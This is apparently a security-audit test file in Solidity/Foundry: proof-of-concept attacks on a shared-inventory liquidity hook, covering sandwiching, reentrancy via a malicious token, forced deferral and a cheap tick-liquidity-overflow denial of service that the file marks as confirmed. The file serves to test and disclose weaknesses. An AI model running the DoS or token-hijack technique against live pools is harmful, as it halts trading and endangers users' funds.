// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import {ICLPoolManager} from "infinity-core/src/pool-cl/interfaces/ICLPoolManager.sol";
import {IVault} from "infinity-core/src/interfaces/IVault.sol";
import {ILockCallback} from "infinity-core/src/interfaces/ILockCallback.sol";
import {IHooks} from "infinity-core/src/interfaces/IHooks.sol";
import {Currency} from "infinity-core/src/types/Currency.sol";
import {PoolKey} from "infinity-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "infinity-core/src/types/PoolId.sol";
import {BalanceDelta} from "infinity-core/src/types/BalanceDelta.sol";
import {TickMath} from "infinity-core/src/pool-cl/libraries/TickMath.sol";
import {Tick} from "infinity-core/src/pool-cl/libraries/Tick.sol";
import {CLPoolParametersHelper} from "infinity-core/src/pool-cl/libraries/CLPoolParametersHelper.sol";
import {SortTokens} from "infinity-core/test/helpers/SortTokens.sol";
import {Deployers} from "infinity-core/test/pool-cl/helpers/Deployers.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {LiquidityAmounts} from "../../src/pool-cl/full-range/libraries/LiquidityAmounts.sol";

import {CLSharedInventoryHook} from "../../src/pool-cl/shared-inventory/CLSharedInventoryHook.sol";
import {ICLSharedInventoryHook} from "../../src/pool-cl/shared-inventory/interfaces/ICLSharedInventoryHook.sol";

/// @dev Generic attacker / LP / victim: runs a list of swaps and liquidity changes inside ONE vault lock, then closes
///      its own deltas from its own token balance. Records whether the hook's deltas were zero after each op.
contract Actor is ILockCallback {
    struct Op {
        uint8 kind; // 0 swap, 1 modifyLiquidity
        PoolKey key;
        bool zeroForOne;
        int256 amount; // swap: amountSpecified; liquidity: liquidityDelta
        int24 lo;
        int24 hi;
    }

    IVault public immutable vault;
    ICLPoolManager public immutable pm;
    address public hook;
    bool public hookDeltaAlwaysClean;

    constructor(IVault _vault, ICLPoolManager _pm, address _hook) {
        (vault, pm, hook) = (_vault, _pm, _hook);
    }

    function run(Op[] memory ops, Currency[] memory cs) external returns (BalanceDelta[] memory) {
        return abi.decode(vault.lock(abi.encode(ops, cs)), (BalanceDelta[]));
    }

    function lockAcquired(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(vault), "not vault");
        (Op[] memory ops, Currency[] memory cs) = abi.decode(data, (Op[], Currency[]));
        BalanceDelta[] memory out = new BalanceDelta[](ops.length);
        hookDeltaAlwaysClean = true;
        for (uint256 i; i < ops.length; i++) {
            Op memory o = ops[i];
            if (o.kind == 0) {
                out[i] = pm.swap(
                    o.key,
                    ICLPoolManager.SwapParams({
                        zeroForOne: o.zeroForOne,
                        amountSpecified: o.amount,
                        sqrtPriceLimitX96: o.zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1
                    }),
                    ""
                );
            } else {
                (out[i],) = pm.modifyLiquidity(
                    o.key, ICLPoolManager.ModifyLiquidityParams(o.lo, o.hi, o.amount, bytes32(0)), ""
                );
            }
            for (uint256 j; j < cs.length; j++) {
                if (vault.currencyDelta(hook, cs[j]) != 0) hookDeltaAlwaysClean = false;
            }
        }
        for (uint256 j; j < cs.length; j++) {
            int256 d = vault.currencyDelta(address(this), cs[j]);
            if (d < 0) {
                vault.sync(cs[j]);
                MockERC20(Currency.unwrap(cs[j])).transfer(address(vault), uint256(-d));
                vault.settle();
            } else if (d > 0) {
                vault.take(cs[j], address(this), uint256(d));
            }
        }
        return abi.encode(out);
    }
}

/// @dev Token whose transfer from `hook` to `vault` (the hook paying its settle) re-enters the vault and steals the
///      sync'd credit via `settle()` before the hook's own `settle()` runs.
contract SettleHijackToken is MockERC20 {
    address public hook;
    address public vault;
    bool public armed;
    bool public fired;

    constructor() MockERC20("HIJ", "HIJ", 18) {}

    function arm(address _hook, address _vault) external {
        (hook, vault, armed) = (_hook, _vault, true);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        bool r = super.transfer(to, amount);
        if (armed && msg.sender == hook && to == vault) {
            armed = false;
            fired = true;
            IVault(vault).settle(); // credit the hook's payment to this token contract
        }
        return r;
    }
}

/// @dev Token that snapshots the hook's reported inventory (both legs of `pair`) when the vault pays the hook.
contract InventoryProbeToken is MockERC20 {
    address public hook;
    Currency public other;
    uint256 public seenSelf;
    uint256 public seenOther;
    bool public fired;

    constructor() MockERC20("PRB", "PRB", 18) {}

    function arm(address _hook, Currency _other) external {
        (hook, other, fired) = (_hook, _other, false);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        bool r = super.transfer(to, amount);
        if (hook != address(0) && to == hook && !fired) {
            fired = true;
            seenSelf = ICLSharedInventoryHook(hook).inventoryOf(Currency.wrap(address(this)));
            seenOther = ICLSharedInventoryHook(hook).inventoryOf(other);
        }
        return r;
    }
}

/// @notice Attacker-driven PoCs against CLSharedInventoryHook on infinity-core 7c1090e (the BSC deployment, no
///         AppDeficit).
/// @dev A, B, C are "mainstream": hookless full-range pools held by `whale` give them a large CL-wide
///      `reservesOfApp` (as USDT/WBNB/CAKE have on BSC), so hook swaps remove inline. D is "long-tail": no other CL
///      liquidity, so a swap that sells D into a hook pool defers its removal; selling A into PD (D,A) is inline.
contract CLSharedInventoryHookAttackTest is Test, Deployers {
    using PoolIdLibrary for PoolKey;
    using CLPoolParametersHelper for bytes32;

    uint256 constant INVENTORY = 1_000e18;
    uint128 constant L = 1e21;
    int24 constant LOWER = -600;
    int24 constant UPPER = 600;
    bytes32 constant SALT = 0x2dd421f327b24150303d8f1213699124a1c7bb24e1d9d96ac0280c16e513b260;

    IVault vault;
    ICLPoolManager poolManager;
    CLSharedInventoryHook hook;

    MockERC20 tA;
    MockERC20 tB;
    MockERC20 tC;
    MockERC20 tD;
    PoolKey p1; // (A,B)
    PoolKey p2; // (A,C)
    PoolKey p3; // (B,C)
    PoolKey pD; // (D,A), D long-tail

    Actor attacker;
    Actor victim;
    Actor lp;
    Actor whale;

    address CREATOR = makeAddr("creator");
    address EOA = makeAddr("attackerEOA");

    function setUp() public {
        (vault, poolManager) = createFreshManager();
        hook = new CLSharedInventoryHook(poolManager, address(this));
        attacker = new Actor(vault, poolManager, address(hook));
        victim = new Actor(vault, poolManager, address(hook));
        lp = new Actor(vault, poolManager, address(hook));
        whale = new Actor(vault, poolManager, address(hook));

        MockERC20[] memory ts = deployTokens(4, type(uint256).max);
        (tA, tB, tC, tD) = (ts[0], ts[1], ts[2], ts[3]);
        for (uint256 i; i < 4; i++) _fund(ts[i]);
        _seedReserve(tA, tB);
        _seedReserve(tB, tC);

        address[] memory who = new address[](1);
        bool[] memory yes = new bool[](1);
        (who[0], yes[0]) = (CREATOR, true);
        hook.setPoolCreator(who, yes);

        p1 = _createPool(tA, tB, 2500, LOWER, UPPER, L);
        p2 = _createPool(tA, tC, 2500, LOWER, UPPER, L);
        p3 = _createPool(tB, tC, 2500, LOWER, UPPER, L);
        pD = _createPool(tD, tA, 2500, LOWER, UPPER, L);
    }

    /*//////////////////////////////////////////////////////////////
                                HELPERS
    //////////////////////////////////////////////////////////////*/

    function _fund(MockERC20 t) internal {
        t.transfer(address(hook), INVENTORY);
        t.transfer(address(attacker), 1e24);
        t.transfer(address(victim), 1e24);
        t.transfer(address(lp), 1e24);
    }

    function _cfg(int24 lo, int24 hi, uint128 liq) internal pure returns (ICLSharedInventoryHook.PoolConfig memory) {
        return ICLSharedInventoryHook.PoolConfig({enabled: true, tickLower: lo, tickUpper: hi, liquidity: liq});
    }

    /// @dev Hookless full-range (a,b) pool holding ~1e27 of each: CL-wide reserve, as other pools provide on BSC.
    function _seedReserve(MockERC20 a, MockERC20 b) internal {
        a.transfer(address(whale), 2e27);
        b.transfer(address(whale), 2e27);
        PoolKey memory k = _keyFor(a, b, 500, address(0));
        poolManager.initialize(k, SQRT_RATIO_1_1);
        whale.run(_one(_liqOp(k, -887270, 887270, 1e27)), _cs(k));
    }

    function _dIs0() internal view returns (bool) {
        return Currency.unwrap(pD.currency0) == address(tD);
    }

    function _keyFor(MockERC20 a, MockERC20 b, uint24 fee, address hooks) internal view returns (PoolKey memory k) {
        (Currency c0, Currency c1) = SortTokens.sort(a, b);
        bytes32 params = hooks == address(0) ? bytes32(0) : bytes32(uint256(hook.getHooksRegistrationBitmap()));
        k = PoolKey(c0, c1, IHooks(hooks), poolManager, fee, params.setTickSpacing(10));
    }

    function _createPool(MockERC20 a, MockERC20 b, uint24 fee, int24 lo, int24 hi, uint128 liq)
        internal
        returns (PoolKey memory k)
    {
        k = _keyFor(a, b, fee, address(hook));
        PoolKey[] memory keys = new PoolKey[](1);
        keys[0] = k;
        ICLSharedInventoryHook.PoolConfig[] memory cfgs = new ICLSharedInventoryHook.PoolConfig[](1);
        cfgs[0] = _cfg(lo, hi, liq);
        uint160[] memory prices = new uint160[](1);
        prices[0] = SQRT_RATIO_1_1;
        hook.setUninitializePoolConfigs(keys, cfgs, prices, false);
        vm.prank(CREATOR, CREATOR);
        poolManager.initialize(k, SQRT_RATIO_1_1);
    }

    function _cs(PoolKey memory k) internal pure returns (Currency[] memory cs) {
        cs = new Currency[](2);
        (cs[0], cs[1]) = (k.currency0, k.currency1);
    }

    function _swapOp(PoolKey memory k, bool z, int256 amt) internal pure returns (Actor.Op memory) {
        return Actor.Op(0, k, z, amt, 0, 0);
    }

    function _liqOp(PoolKey memory k, int24 lo, int24 hi, int256 liq) internal pure returns (Actor.Op memory) {
        return Actor.Op(1, k, false, liq, lo, hi);
    }

    function _one(Actor.Op memory o) internal pure returns (Actor.Op[] memory ops) {
        ops = new Actor.Op[](1);
        ops[0] = o;
    }

    function _swap(Actor who, PoolKey memory k, bool z, int256 amt) internal returns (BalanceDelta) {
        return who.run(_one(_swapOp(k, z, amt)), _cs(k))[0];
    }

    function _hookSum(PoolKey memory k) internal view returns (int256) {
        return int256(hook.inventoryOf(k.currency0) + hook.inventoryOf(k.currency1));
    }

    function _pendingL() internal view returns (uint128) {
        (, ICLSharedInventoryHook.PoolConfig memory c) = hook.pendingRemoval();
        return c.liquidity;
    }

    function _contains(bytes memory hay, bytes4 sel) internal pure returns (bool) {
        if (hay.length < 4) return false;
        for (uint256 i; i + 4 <= hay.length; i++) {
            if (hay[i] == sel[0] && hay[i + 1] == sel[1] && hay[i + 2] == sel[2] && hay[i + 3] == sel[3]) return true;
        }
        return false;
    }

    /*//////////////////////////////////////////////////////////////
          1. SANDWICH / JIT EXTRACTION == STATIC LP (REFUTED, inline path)
    //////////////////////////////////////////////////////////////*/

    /// The JIT position is minted at the current price and burned after the swap, so for every swap it presents the
    /// SAME liquidity a resident LP of `L` over the same range would. Run an identical attack sequence (sandwich around
    /// a victim, then a push far out of range and back) on the hooked pool H and on a hookless twin S holding a
    /// resident `L` position: every swap returns bit-identical deltas, and the hook's P&L equals the static LP's P&L
    /// within mint/burn rounding. Whatever an attacker can extract from the hook it could extract from any LP.
    function test_sandwich_hookEqualsStaticLP_noExtraExtraction() public {
        PoolKey memory h = _createPool(tA, tB, 3000, LOWER, UPPER, L);
        PoolKey memory s = _keyFor(tA, tB, 3000, address(0));
        poolManager.initialize(s, SQRT_RATIO_1_1);
        BalanceDelta dep = lp.run(_one(_liqOp(s, LOWER, UPPER, int256(uint256(L)))), _cs(s))[0];

        // victim alone, for the sandwich-loss baseline
        uint256 snap = vm.snapshotState();
        int128 victimAlone = _swap(victim, h, true, -10e18).amount1();
        vm.revertToState(snap);

        int256 h0 = _hookSum(h);
        int256 hookC0 = int256(hook.inventoryOf(h.currency0));
        int256 atkPnL;
        int128 victimSandwiched;
        int256[2] memory atkTok;
        for (uint256 pass; pass < 2; pass++) {
            PoolKey memory k = pass == 0 ? h : s;
            BalanceDelta f = _swap(attacker, k, true, -20e18); // front-run
            BalanceDelta v = _swap(victim, k, true, -10e18);
            BalanceDelta b = _swap(attacker, k, false, -int256(f.amount1())); // back-run: sell what it bought
            BalanceDelta x = _swap(attacker, k, false, -200e18); // push past the range (to the price limit)
            BalanceDelta y = _swap(attacker, k, true, -40e18); // and back into it
            int256 pnl = int256(f.amount0()) + f.amount1() + b.amount0() + b.amount1();
            if (pass == 0) {
                atkPnL = pnl;
                victimSandwiched = v.amount1();
                atkTok[0] = int256(f.amount0()) + b.amount0() + x.amount0() + y.amount0();
                atkTok[1] = int256(f.amount1()) + b.amount1() + x.amount1() + y.amount1();
                // hook's books must be closed inside every swap
                assertTrue(attacker.hookDeltaAlwaysClean(), "hook delta open");
            } else {
                assertEq(pnl, atkPnL, "sandwich P&L differs between JIT and static LP");
                assertEq(v.amount1(), victimSandwiched, "victim fill differs");
                assertEq(int256(f.amount0()) + b.amount0() + x.amount0() + y.amount0(), atkTok[0], "flow0 differs");
                assertEq(int256(f.amount1()) + b.amount1() + x.amount1() + y.amount1(), atkTok[1], "flow1 differs");
            }
        }

        // static LP withdraws; compare its token P&L with the hook's inventory P&L, per token
        BalanceDelta wd = lp.run(_one(_liqOp(s, LOWER, UPPER, -int256(uint256(L)))), _cs(s))[0];
        int256 static0 = int256(wd.amount0()) + dep.amount0();
        int256 static1 = int256(wd.amount1()) + dep.amount1();
        int256 jit0 = int256(hook.inventoryOf(h.currency0)) - hookC0;
        int256 jit1 = (_hookSum(h) - h0) - jit0;
        emit log_named_decimal_int("attacker sandwich P&L (1:1)", atkPnL, 18);
        emit log_named_decimal_int("victim loss to sandwich (token1)", int256(victimAlone) - victimSandwiched, 18);
        emit log_named_decimal_int("hook P&L token0", jit0, 18);
        emit log_named_decimal_int("hook P&L token1", jit1, 18);
        emit log_named_decimal_int("static LP P&L token0", static0, 18);
        emit log_named_decimal_int("static LP P&L token1", static1, 18);
        assertApproxEqAbs(jit0, static0, 12, "hook P&L != static LP P&L (0)");
        assertApproxEqAbs(jit1, static1, 12, "hook P&L != static LP P&L (1)");
        assertEq(_pendingL(), 0);
    }

    /*//////////////////////////////////////////////////////////////
        2. MAX-LIQUIDITY-PER-TICK GRIEF: PERSISTENT POOL DoS (CONFIRMED)
    //////////////////////////////////////////////////////////////*/

    /// A JIT hook re-MINTS on every swap, so anything that makes a mint at its tick revert halts the pool. An attacker
    /// parks `maxLiquidityPerTick - L + 1` of its own liquidity on the hook's boundary tick (out of range, so
    /// single-sided). The hook's next mint overflows `liquidityGross` -> TickLiquidityOverflow -> EVERY swap on the
    /// pool reverts, in both directions, until the owner re-ranges (and the attacker can repeat). Near the extreme
    /// ticks (a "full-range" config) this costs dust because sqrtPrice there is ~2^-64. Mainstream pool: its swaps
    /// remove inline, so no pending record holds the hook's L on the tick between swaps.
    function test_dos_tickLiquidityOverflow_wideRange_costsDust() public {
        int24 lo = -887270;
        int24 hi = 887270;
        uint128 l = 1e20;
        PoolKey memory w = _createPool(tA, tB, 500, lo, hi, l);
        _swap(victim, w, true, -1e18); // works before

        uint128 maxPerTick = Tick.tickSpacingToMaxLiquidityPerTick(10);
        int256 grief = int256(uint256(maxPerTick - l + 1));
        BalanceDelta cost = attacker.run(_one(_liqOp(w, lo, lo + 10, grief)), _cs(w))[0];
        emit log_named_uint("maxLiquidityPerTick", maxPerTick);
        emit log_named_int("attacker cost token0 (wei)", -cost.amount0());
        emit log_named_int("attacker cost token1 (wei)", -cost.amount1());
        assertLt(uint256(int256(-cost.amount0() - cost.amount1())), 1e12, "grief costs more than 1e-6 token");

        for (uint256 i; i < 2; i++) {
            try victim.run(_one(_swapOp(w, i == 0, -1e18)), _cs(w)) {
                fail();
            } catch (bytes memory err) {
                assertTrue(_contains(err, Tick.TickLiquidityOverflow.selector), "not TickLiquidityOverflow");
            }
        }
        // shared inventory untouched; other pools keep working
        _swap(victim, p1, true, -1e18);

        // the attacker can withdraw at will: the grief is free capital-wise too
        attacker.run(_one(_liqOp(w, lo, lo + 10, -grief)), _cs(w));
        _swap(victim, w, true, -1e18);
    }

    /// Same grief on the narrow ±600 range needs ~1e30 wei of one token: not practical for ordinary tokens.
    function test_dos_tickLiquidityOverflow_narrowRange_isExpensive() public pure {
        uint128 grief = Tick.tickSpacingToMaxLiquidityPerTick(10) - L + 1;
        (, uint256 need1) = LiquidityAmounts.getAmountsForLiquidity(
            SQRT_RATIO_1_1, TickMath.getSqrtRatioAtTick(LOWER - 10), TickMath.getSqrtRatioAtTick(LOWER), grief
        );
        assertGt(need1, 1e29);
    }

    /// The grief's (refundable) capital scales with the boundary tick: amount of token1 that
    /// `maxLiquidityPerTick - L + 1` costs on [lo, lo + 10] at a 1:1 price, for L = 1e20.
    function test_dos_griefCost_byBoundaryTick() public {
        int24[4] memory los = [int24(-887270), -550000, -400000, -300000];
        uint256[4] memory cost;
        uint128 grief = Tick.tickSpacingToMaxLiquidityPerTick(10) - 1e20 + 1;
        for (uint256 i; i < 4; i++) {
            (, cost[i]) = LiquidityAmounts.getAmountsForLiquidity(
                SQRT_RATIO_1_1, TickMath.getSqrtRatioAtTick(los[i]), TickMath.getSqrtRatioAtTick(los[i] + 10), grief
            );
            emit log_named_int("boundary tick", los[i]);
            emit log_named_decimal_uint("  grief capital (token1, 18 dp)", cost[i], 18);
        }
        assertLt(cost[0], 1e11);
        assertGt(cost[1], 1e18);
        assertGt(cost[3], 1e23);
    }

    /// The same grief on a pool whose swaps DEFER (long-tail D sold in). While the pool's own position is parked
    /// under the pending record, its `L` already sits on the boundary tick, so the attacker can only fill
    /// `maxLiquidityPerTick - L`: the next swap's flush removes `L` before re-injecting it, and the pool keeps working.
    /// A record parked there is cleared by any inline swap (here: selling mainstream A into the same pool). In that
    /// lock the attacker adds the last unit and the pool is down in both directions, as on the inline path.
    function test_dos_tickLiquidityOverflow_deferringPool_needsParkedRecordCleared() public {
        int24 lo = -887270;
        int24 hi = 887270;
        uint128 l = 1e20;
        PoolKey memory w = _createPool(tD, tA, 500, lo, hi, l);
        bool sellD = Currency.unwrap(w.currency0) == address(tD);
        _swap(victim, w, sellD, -1e18);
        assertEq(_pendingL(), l, "long-tail input defers: w's L parked on the boundary");

        uint128 maxPerTick = Tick.tickSpacingToMaxLiquidityPerTick(10);
        int256 fill = int256(uint256(maxPerTick - l));
        attacker.run(_one(_liqOp(w, lo, lo + 10, fill)), _cs(w));
        _swap(victim, w, sellD, -1e18); // flush (-L) then inject (+L): fits, pool still works
        assertEq(_pendingL(), l);
        try attacker.run(_one(_liqOp(w, lo, lo + 10, 1)), _cs(w)) { // one more unit while parked: rejected
            fail();
        } catch (bytes memory err) {
            assertTrue(_contains(err, Tick.TickLiquidityOverflow.selector));
        }

        // clear the record with an inline swap (A in), then add the last unit — same lock
        Actor.Op[] memory ops = new Actor.Op[](2);
        ops[0] = _swapOp(w, !sellD, -1e15);
        ops[1] = _liqOp(w, lo, lo + 10, 1);
        attacker.run(ops, _cs(w));
        assertEq(_pendingL(), 0, "record cleared by the inline swap");

        for (uint256 i; i < 2; i++) {
            try victim.run(_one(_swapOp(w, i == 0, -1e18)), _cs(w)) {
                fail();
            } catch (bytes memory err) {
                assertTrue(_contains(err, Tick.TickLiquidityOverflow.selector), "not TickLiquidityOverflow");
            }
        }
    }

    /*//////////////////////////////////////////////////////////////
      3. DEFERRAL ON 7c1090e: FORCING IT, AND MULTI-HOP ROUTES
    //////////////////////////////////////////////////////////////*/

    /// Long-tail D whose only other CL liquidity is the attacker's own hookless pool (D,C), ~100 D. Selling 5 D into
    /// PD removes inline while that reserve is there. Pulling the reserve out in the same lock first makes the same
    /// swap defer: whoever holds a long-tail token's CL liquidity decides whether its hook swaps defer.
    function test_forceDeferral_longTail_pullOwnReserveInSameLock() public {
        PoolKey memory s = _keyFor(tD, tC, 3000, address(0));
        poolManager.initialize(s, SQRT_RATIO_1_1);
        attacker.run(_one(_liqOp(s, -887270, 887270, 100e18)), _cs(s));
        Currency[] memory cs = new Currency[](3);
        (cs[0], cs[1], cs[2]) = (Currency.wrap(address(tD)), Currency.wrap(address(tA)), Currency.wrap(address(tC)));

        uint256 snap = vm.snapshotState();
        attacker.run(_one(_swapOp(pD, _dIs0(), -5e18)), cs);
        assertEq(_pendingL(), 0, "reserve present: inline");
        vm.revertToState(snap);

        Actor.Op[] memory ops = new Actor.Op[](2);
        ops[0] = _liqOp(s, -887270, 887270, -100e18);
        ops[1] = _swapOp(pD, _dIs0(), -5e18);
        attacker.run(ops, cs);
        assertEq(_pendingL(), L, "reserve pulled in the same lock: deferred");
        assertTrue(attacker.hookDeltaAlwaysClean());
    }

    /// Router pattern: several swaps in ONE lock, input paid at the end. Hop 1 sells long-tail D into PD and defers;
    /// hop 2 (any hook pool) flushes in beforeSwap and `take`s PD's position (principal + hop-1 input) out of the vault.
    /// The hop-1 input is not paid yet and the vault holds no other D, so the token transfer underflows and the whole
    /// route reverts. Nothing is lost. A single-hop D sale, or a route whose first hop removes inline, succeeds.
    function test_multiHop_longTailFirstHopDefers_routeReverts() public {
        Currency[] memory cs = new Currency[](3);
        (cs[0], cs[1], cs[2]) = (Currency.wrap(address(tD)), Currency.wrap(address(tA)), Currency.wrap(address(tB)));
        bool aIs0p1 = Currency.unwrap(p1.currency0) == address(tA);
        Actor.Op[] memory ops = new Actor.Op[](2);
        ops[0] = _swapOp(pD, _dIs0(), -5e18); // D -> A: defers
        ops[1] = _swapOp(p1, aIs0p1, -1e18); // A -> B: flush takes D the vault does not hold yet
        uint256 d0 = tD.balanceOf(address(hook));
        try victim.run(ops, cs) {
            fail();
        } catch (bytes memory err) {
            assertTrue(_contains(err, bytes4(keccak256("Panic(uint256)"))), "not the vault's D transfer");
        }
        assertEq(tD.balanceOf(address(hook)), d0, "route reverted as a whole");

        uint256 snap = vm.snapshotState();
        victim.run(_one(ops[0]), cs); // single hop: deferred, then flushed by any later swap
        assertEq(_pendingL(), L);
        _swap(victim, p3, true, -1e18);
        assertEq(_pendingL(), 0);
        vm.revertToState(snap);

        ops[0] = _swapOp(pD, !_dIs0(), -5e18); // A -> D: mainstream input, inline
        ops[1] = _swapOp(p1, aIs0p1, -1e18);
        victim.run(ops, cs);
        assertEq(_pendingL(), 0);
    }

    /*//////////////////////////////////////////////////////////////
                         4. REENTRANCY (REFUTED)
    //////////////////////////////////////////////////////////////*/

    /// Malicious pool token hijacks the hook's sync->transfer->settle: during the hook's transfer to the vault it calls
    /// `vault.settle()` and takes the credit. The hook's own settle then pays 0, its delta stays open, and the vault
    /// refuses to close the lock: the attacker's swap reverts. Nothing is stolen.
    function test_reentrancy_settleHijack_revertsWholeSwap() public {
        SettleHijackToken evil = new SettleHijackToken();
        evil.mint(address(this), 1e30);
        _fund(MockERC20(address(evil)));
        PoolKey memory k = _createPool(MockERC20(address(evil)), tA, 2500, LOWER, UPPER, L);
        bool buyEvil = Currency.unwrap(k.currency1) == address(evil); // zeroForOne buys currency1
        uint256 hookEvil = evil.balanceOf(address(hook));
        uint256 hookA = tA.balanceOf(address(hook));

        evil.arm(address(hook), address(vault));
        try victim.run(_one(_swapOp(k, buyEvil, -5e18)), _cs(k)) {
            fail();
        } catch (bytes memory err) {
            assertEq(bytes4(err), IVault.CurrencyNotSettled.selector);
        }
        assertEq(evil.balanceOf(address(hook)), hookEvil);
        assertEq(tA.balanceOf(address(hook)), hookA);
    }

    /// Inline path: while the vault pays the hook in afterSwap (currency0 leg first), a token callback sees
    /// `inventoryOf` with the input credited but the output not yet paid — the pair sum is higher by ~the swap
    /// output. Only matters to an integrator that prices something off `inventoryOf` mid-swap.
    function test_inventoryOfMidSwap_inputCreditedBeforeOutputPaid() public {
        InventoryProbeToken probe;
        for (uint256 i;; i++) {
            probe = new InventoryProbeToken{salt: bytes32(i)}();
            if (address(probe) < address(tA)) break; // probe must be currency0 so its take precedes A's settle
        }
        probe.mint(address(this), 1e30);
        _fund(MockERC20(address(probe)));
        _seedReserve(MockERC20(address(probe)), tA); // inline path
        PoolKey memory k = _createPool(MockERC20(address(probe)), tA, 2500, LOWER, UPPER, L);
        int256 before = _hookSum(k);
        probe.arm(address(hook), k.currency1);
        BalanceDelta d = _swap(victim, k, true, -10e18); // sell probe (currency0), buy A
        assertTrue(probe.fired());
        int256 mid = int256(probe.seenSelf() + probe.seenOther());
        int256 post = _hookSum(k);
        emit log_named_decimal_int("hook pair sum before", before, 18);
        emit log_named_decimal_int("hook pair sum seen mid-swap", mid, 18);
        emit log_named_decimal_int("hook pair sum after", post, 18);
        assertApproxEqAbs(mid - post, int256(d.amount1()), 2, "mid-swap inflation == swap output");
    }

    /*//////////////////////////////////////////////////////////////
               5. UNAUTHORIZED POOLS / CROSS-POOL (REFUTED)
    //////////////////////////////////////////////////////////////*/

    /// Even with creation opened up, an attacker's own pool (malicious token paired with shared token A) gets no
    /// config, so the hook injects nothing, moves no A, records no pending removal. The attacker cannot configure it.
    function test_attackerPool_getsNoInventory() public {
        SettleHijackToken evil = new SettleHijackToken();
        evil.mint(address(attacker), 1e30);
        PoolKey memory k = _keyFor(MockERC20(address(evil)), tA, 100, address(hook));

        vm.prank(EOA, EOA);
        vm.expectRevert();
        poolManager.initialize(k, SQRT_RATIO_1_1); // restricted by default

        hook.setRestrictedPoolCreation(false);
        vm.prank(EOA, EOA);
        poolManager.initialize(k, SQRT_RATIO_1_1);

        uint256 a0 = tA.balanceOf(address(hook));
        Actor.Op[] memory ops = new Actor.Op[](3);
        ops[0] = _liqOp(k, -600, 600, 1e21);
        ops[1] = _swapOp(k, true, -5e18);
        ops[2] = _swapOp(k, false, -5e18);
        attacker.run(ops, _cs(k));
        assertEq(tA.balanceOf(address(hook)), a0, "attacker pool moved shared inventory");
        assertEq(_pendingL(), 0);
        assertFalse(hook.getPoolConfig(k.toId()).enabled);

        PoolId[] memory ids = new PoolId[](1);
        ids[0] = k.toId();
        ICLSharedInventoryHook.PoolConfig[] memory cfgs = new ICLSharedInventoryHook.PoolConfig[](1);
        cfgs[0] = _cfg(-600, 600, 1e21);
        uint256[] memory mx = new uint256[](1);
        mx[0] = type(uint256).max;
        vm.prank(EOA);
        vm.expectRevert();
        hook.setPoolConfigs(ids, cfgs, false, mx, mx);
    }

    /// Flash-style: one lock, triangular A->B->C->A across the three pools that share every token. No injection
    /// carries from one pool's swap into the next (hook deltas are zero after each), and the loop loses fees.
    function test_crossPool_triangleInOneLock_losesFees() public {
        Currency[] memory cs = new Currency[](3);
        (cs[0], cs[1], cs[2]) = (Currency.wrap(address(tA)), Currency.wrap(address(tB)), Currency.wrap(address(tC)));
        uint256[3] memory b0 = [tA.balanceOf(address(attacker)), tB.balanceOf(address(attacker)), tC.balanceOf(address(attacker))];

        bool aIs0p1 = Currency.unwrap(p1.currency0) == address(tA);
        bool bIs0p3 = Currency.unwrap(p3.currency0) == address(tB);
        bool cIs0p2 = Currency.unwrap(p2.currency0) == address(tC);
        Actor.Op[] memory ops = new Actor.Op[](3);
        ops[0] = _swapOp(p1, aIs0p1, -20e18); // A -> B
        ops[1] = _swapOp(p3, bIs0p3, -19e18); // B -> C
        ops[2] = _swapOp(p2, cIs0p2, -18e18); // C -> A
        attacker.run(ops, cs);
        assertTrue(attacker.hookDeltaAlwaysClean(), "hook delta carried across pools");

        int256 pnl = int256(tA.balanceOf(address(attacker)) + tB.balanceOf(address(attacker))
            + tC.balanceOf(address(attacker))) - int256(b0[0] + b0[1] + b0[2]);
        emit log_named_decimal_int("triangle P&L (1:1)", pnl, 18);
        assertLt(pnl, 0, "triangle at consistent prices profited");
    }
}
